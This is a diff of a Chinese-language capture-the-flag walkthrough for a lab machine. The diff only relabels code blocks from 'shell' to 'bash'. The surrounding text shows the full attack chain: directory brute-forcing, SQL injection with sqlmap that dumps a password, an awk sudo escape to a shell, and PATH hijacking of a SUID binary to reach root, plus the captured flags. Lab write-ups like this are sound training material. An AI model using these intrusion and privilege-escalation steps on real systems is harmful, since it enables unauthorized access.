@@ -46,7 +46,7 @@ PORT   STATE SERVICE VERSION
 
 尝试进行目录爆破
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~]
 └──╼ $feroxbuster -u http://192.168.56.108 -w /usr/share/wordlists/seclists//Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 
@@ -111,7 +111,7 @@ Upgrade-Insecure-Requests: 1
 
 将原始请求的数据保存为 `sqlmap.txt` 文件，进行自动化攻击
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $sqlmap -r sqlmap.txt --dbs
 ......
@@ -154,7 +154,7 @@ pmccentral:999999999
 
 ## User - pmccentral
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $pwncat-cs pmccentral@192.168.56.108
 [19:46:46] Welcome to pwncat 🐈!
@@ -167,7 +167,7 @@ pmccentral
 
 ### 读取命令行历史
 
-```shell title="/home/pmccentral/.bash_history"
+```bash title="/home/pmccentral/.bash_history"
 ls
 cd laboratoryuser/
 sudo su
@@ -209,7 +209,7 @@ exit
 
 ### 尝试提权
 
-```shell title="sudo -l"
+```bash title="sudo -l"
 (remote) pmccentral@laboratoryuser:/home/pmccentral$ sudo -l
 [sudo] password for pmccentral:
 Matching Defaults entries for pmccentral on laboratoryuser:
@@ -221,20 +221,20 @@ User pmccentral may run the following commands on laboratoryuser:
 
 尝试利用 awk 实现提权
 
-```shell
+```bash
 sudo -u laboratoryadmin /usr/bin/awk 'BEGIN {system("/bin/bash")}'
 ```
 
 ## User - laboratoryadmin
 
-```shell
+```bash
 laboratoryadmin@laboratoryuser:/home/pmccentral$ whoami
 laboratoryadmin
 ```
 
 ### flag - user
 
-```shell
+```bash
 laboratoryadmin@laboratoryuser:~$ cat user.txt
 flag{$udOeR$_Pr!V11E9E_I5_7En53}
 ```
@@ -243,7 +243,7 @@ flag{$udOeR$_Pr!V11E9E_I5_7En53}
 
 对用户目录进行探测
 
-```shell
+```bash
 laboratoryadmin@laboratoryuser:~/autoScripts$ pwd;ls -lah
 /home/laboratoryadmin/autoScripts
 total 32K
@@ -292,7 +292,7 @@ bash -p
 
 :::
 
-```shell
+```bash
 laboratoryadmin@laboratoryuser:~/autoScripts$ echo '/usr/bin/bash -p' > head
 laboratoryadmin@laboratoryuser:~/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts
 laboratoryadmin@laboratoryuser:~/autoScripts$ ./PMCEmployees
@@ -306,7 +306,7 @@ root
 
 :::
 
-```shell
+```bash
 (remote) laboratoryadmin@laboratoryuser:/home/laboratoryadmin/autoScripts$ export PATH=/home/laboratoryadmin/autoScripts:$PATH
 (remote) laboratoryadmin@laboratoryuser:/home/laboratoryadmin/autoScripts$ ./PMCEmployees
 root@laboratoryuser:~/autoScripts# whoami
@@ -315,7 +315,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@laboratoryuser:/root# cat root.txt
 flag{r00t_t3ns0}
 ```
